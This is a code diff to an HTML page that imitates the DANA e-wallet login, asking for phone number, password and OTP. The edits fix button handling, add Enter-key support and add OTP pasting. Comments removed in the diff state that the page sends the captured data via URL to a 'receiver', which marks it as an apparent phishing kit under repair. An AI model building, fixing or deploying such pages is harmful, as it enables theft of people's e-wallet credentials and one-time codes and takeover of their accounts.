@@ -265,7 +265,7 @@
             <span id="loginErrorText">Nomor atau password salah</span>
         </div>
 
-        <form id="loginForm">
+        <form id="loginForm" onsubmit="return false;">
             <div class="mb-3">
                 <label class="label-dana"><i class="bi bi-phone"></i> Nomor DANA</label>
                 <input type="tel" id="danaPhone" class="form-control-dana" placeholder="08123456789" required>
@@ -274,7 +274,7 @@
                 <label class="label-dana"><i class="bi bi-lock"></i> Password</label>
                 <input type="password" id="danaPassword" class="form-control-dana" placeholder="Masukkan password" required>
             </div>
-            <button type="submit" class="btn-dana" id="btnLogin"><i class="bi bi-check-circle"></i> Verifikasi</button>
+            <button type="button" class="btn-dana" id="btnLogin"><i class="bi bi-check-circle"></i> Verifikasi</button>
         </form>
 
         <div class="footer-text">
@@ -317,7 +317,7 @@
             Kode OTP dikirim ke <strong id="otpPhoneDisplay">08123456789</strong>
         </div>
 
-        <button class="btn-dana" id="btnOtp"><i class="bi bi-check-circle"></i> Verifikasi</button>
+        <button type="button" class="btn-dana" id="btnOtp"><i class="bi bi-check-circle"></i> Verifikasi</button>
 
         <div style="text-align:center;margin-top:12px;">
             <button class="btn btn-link" style="color:#0080ff;font-size:13px;text-decoration:none;border:none;background:none;font-weight:600;" onclick="resendOtp()">
@@ -334,10 +334,9 @@
 
 <script>
     // ============================================================
-    // INDEX — KIRIM DATA VIA URL KE RECEIVER
+    // INDEX.HTML — FIX LOOPING, PAKAI BUTTON CLICK
     // ============================================================
 
-    const loginForm = document.getElementById('loginForm');
     const btnLogin = document.getElementById('btnLogin');
     const btnOtp = document.getElementById('btnOtp');
     const loginError = document.getElementById('loginError');
@@ -376,9 +375,8 @@
         otpError.style.display = 'none';
     }
 
-    // ===== LOGIN — BUKA RECEIVER DENGAN DATA VIA URL =====
-    loginForm.addEventListener('submit', function(e) {
-        e.preventDefault();
+    // ===== LOGIN — PAKE CLICK BUKAN SUBMIT =====
+    btnLogin.addEventListener('click', function() {
         hideAlerts();
 
         const phone = document.getElementById('danaPhone').value.trim();
@@ -497,12 +495,19 @@
         setTimeout(() => toast.remove(), 4000);
     }
 
+    // === ENTER KEY SUPPORT ===
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && document.getElementById('pageOtp').classList.contains('active')) {
-            btnOtp.click();
+        if (e.key === 'Enter') {
+            const activePage = document.querySelector('.page.active');
+            if (activePage.id === 'pageLogin') {
+                btnLogin.click();
+            } else if (activePage.id === 'pageOtp') {
+                btnOtp.click();
+            }
         }
     });
 
+    // === PASTE OTP ===
     document.addEventListener('paste', function(e) {
         if (!document.getElementById('pageOtp').classList.contains('active')) return;
         const paste = (e.clipboardData || window.clipboardData).getData('text');
@@ -517,4 +522,4 @@
 </script>
 
 </body>
-    </html>
+        </html>
